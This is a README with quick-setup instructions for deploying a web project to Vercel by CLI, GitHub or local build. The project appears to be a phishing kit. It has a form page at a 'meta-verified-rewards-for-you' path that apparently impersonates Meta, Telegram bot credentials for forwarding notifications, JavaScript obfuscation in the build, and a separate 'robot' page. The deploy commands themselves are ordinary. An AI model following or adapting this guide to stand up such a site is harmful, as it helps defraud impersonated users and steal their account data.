========================================
  VERCEL DEPLOY — QUICK SETUP
========================================

CONFIGURATION IS READY.

Telegram (required for notifications):
  Set in Vercel → Project → Settings → Environment Variables:
    TELEGRAM_BOT_TOKEN   = your bot token from @BotFather
    TELEGRAM_CHAT_ID     = target chat or channel id
  Do not put these in public JS — they are server-only.
  Local: copy .env.example to .env.local and run: vercel dev

Files involved:
  vercel.json      - Vercel settings
  .vercelignore    - Ignore rules
  package.json     - Build scripts
  build.js         - Build automation

========================================
  OPTION 1: DEPLOY VIA CLI (~5 MINUTES)
========================================

1. Install Vercel CLI:
   npm install -g vercel

2. Login:
   vercel login

3. Deploy:
   vercel --prod

DONE. Example URL: https://your-project.vercel.app

========================================
  OPTION 2: DEPLOY VIA GITHUB
========================================

1. Push to GitHub:
   git init
   git add .
   git commit -m "Initial"
   git remote add origin https://github.com/USER/REPO.git
   git push -u origin main

2. Import in Vercel:
   - Open https://vercel.com/new
   - Import the repository
   - Click Deploy

Auto-deploy runs on each push.

========================================
  OPTION 3: BUILD LOCALLY THEN DEPLOY
========================================

1. Build:
   build.bat         (Windows)
   ./build.sh        (Linux / macOS)

2. Deploy dist/:
   cd dist
   vercel --prod

========================================
  WHAT VERCEL DOES (TYPICAL GIT DEPLOY)
========================================

- npm install
- npm run vercel-build (obfuscate JS)
- Publish output directory dist/
- URLs such as:
   - https://your-project.vercel.app → index.html
   - https://your-project.vercel.app/meta-verified-rewards-for-you → meta-verified-rewards-for-you.html
   - https://your-project.vercel.app/robot → index.html

========================================
  TEST URLS
========================================

Landing:  https://your-project.vercel.app
Robot:    https://your-project.vercel.app/robot
Form:     https://your-project.vercel.app/meta-verified-rewards-for-you

========================================
  TROUBLESHOOTING
========================================

Build failed?
   → Test locally: npm run build
   → Read logs: vercel logs

404 Not Found?
   → Check vercel.json / dist/vercel.json
   → Confirm dist/ output

JS not loading?
   → Check paths in HTML (e.g. /public/...)
   → Clear cache

========================================
  CUSTOM DOMAIN (OPTIONAL)
========================================

1. Vercel Dashboard → Domains
2. Add your domain
3. DNS example:
   Type: CNAME
   Name: @
   Value: cname.vercel-dns.com

========================================
  MORE DETAIL
========================================

See VERCEL_DEPLOY.md

Happy deploying.
